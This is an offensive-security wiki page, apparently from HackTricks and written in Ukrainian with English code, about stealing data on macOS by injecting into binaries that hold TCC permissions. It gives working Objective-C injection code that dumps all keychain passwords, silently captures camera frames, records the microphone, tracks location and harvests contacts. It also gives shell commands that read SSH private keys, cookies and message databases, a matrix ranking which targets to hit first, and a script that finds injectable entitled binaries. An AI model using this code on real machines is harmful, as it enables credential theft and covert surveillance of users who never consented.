# macOS: викрадення облікових даних і даних через дозволи TCC

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

macOS TCC (Прозорість, Згода та Контроль) захищає доступ до чутливих даних користувача. Коли зловмисник **компрометує двійковий файл, який вже має дозволи TCC**, він успадковує ці дозволи. Ця сторінка документує потенціал експлуатації кожного дозволу TCC, пов’язаного з крадіжкою даних.

> [!WARNING]
> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **мовчки успадковує всі його дозволи TCC**. Не виникає додаткового запиту чи перевірки, коли той самий процес читає захищені дані.

---

## Keychain Access Groups

### Нагорода

У macOS Keychain зберігаються:
- **Wi-Fi passwords** — всі збережені облікові дані бездротових мереж
- **Website passwords** — Safari, Chrome (when using Keychain), та паролі інших браузерів
- **Application passwords** — облікові записи електронної пошти, облікові дані VPN, токени для розробки
- **Certificates and private keys** — підпис коду, клієнтський TLS, шифрування S/MIME
- **Secure notes** — секрети, збережені користувачем

### Дозвіл: `keychain-access-groups`

Елементи Keychain організовані у **групи доступу**. Дозвіл додатку `keychain-access-groups` перелічує групи, до яких він може отримати доступ:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Експлуатація
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Доступ до камери (kTCCServiceCamera)

### Експлуатація

Бінарний файл із наданим доступом TCC до камери (через `kTCCServiceCamera` або `com.apple.security.device.camera` entitlement) може захоплювати фотографії та відео:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Безшумне захоплення
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Починаючи з **macOS Sonoma**, індикатор камери в панелі меню постійний і не можна приховати програмно. У **старіших версіях macOS** коротке захоплення може не спричинити помітного індикатора.
> 
---

## Доступ до мікрофона (kTCCServiceMicrophone)

### Експлуатація

Доступ до мікрофона фіксує весь звук з вбудованого мікрофона, гарнітури або підключених аудіовхідних пристроїв:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Атака: Запис навколишнього звуку
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Відстеження місцезнаходження (kTCCServiceLocation)

### Експлуатація
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Безперервне відстеження
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Контакти / Календар / Фотографії

### Екфільтрація персональних даних

| TCC Service | Framework | Data |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Імена, електронні адреси, телефони, адреси |
| `kTCCServiceCalendar` | `EventKit` | Зустрічі, учасники, місця |
| `kTCCServicePhotos` | `Photos.framework` | Фотографії, скріншоти, метадані місцезнаходження |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Збирання контактів
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Доступ до облікового запису iCloud

### Дозвіл: `com.apple.private.icloud-account-access`

Цей дозвіл дозволяє взаємодіяти зі службою XPC `com.apple.iCloudHelper`, надаючи доступ до:
- **iCloud tokens** — токени автентифікації для Apple ID користувача
- **iCloud Drive** — синхронізовані документи з усіх пристроїв
- **iCloud Keychain** — паролі, синхронізовані на всіх пристроях Apple
- **Find My** — місцезнаходження всіх Apple-пристроїв користувача
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Компрометація iCloud-entitled бінарного файлу розширює атаку з **одного пристрою на всю екосистему Apple**: інші Macs, iPhones, iPads, Apple Watch. Синхронізація iCloud Keychain означає, що паролі з усіх пристроїв стають доступними.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### The Most Powerful TCC Permission

Full Disk Access надає можливість читання **кожного файлу в системі**, включно з:
- Дані інших додатків (Messages, Mail, історія Safari)
- TCC databases (розкриваючи всі інші дозволи)
- SSH ключі та конфігурація
- Браузерні cookies та сесійні токени
- Бази даних і кеші додатків
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation Priority Matrix

Під час оцінки injectable TCC-granted binaries, пріоритезуйте за цінністю даних:

| Пріоритет | TCC Permission | Чому |
|---|---|---|
| **Критичний** | Full Disk Access | Доступ до всього |
| **Критичний** | TCC Manager | Може надати будь-який дозвіл |
| **Високий** | Keychain Access Groups | Усі збережені паролі |
| **Високий** | iCloud Account Access | Компрометація на кількох пристроях |
| **Високий** | Input Monitoring (ListenEvent) | Keylogging |
| **Високий** | Accessibility | Контроль GUI, можливість самонадання дозволів |
| **Середній** | Screen Capture | Захоплення візуальних даних |
| **Середній** | Camera + Microphone | Спостереження |
| **Середній** | Contacts + Calendar | Дані для соціальної інженерії |
| **Низький** | Location | Фізичне відстеження |
| **Низький** | Photos | Особисті дані |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Посилання

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objectivesee.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../banners/hacktricks-training.md}}
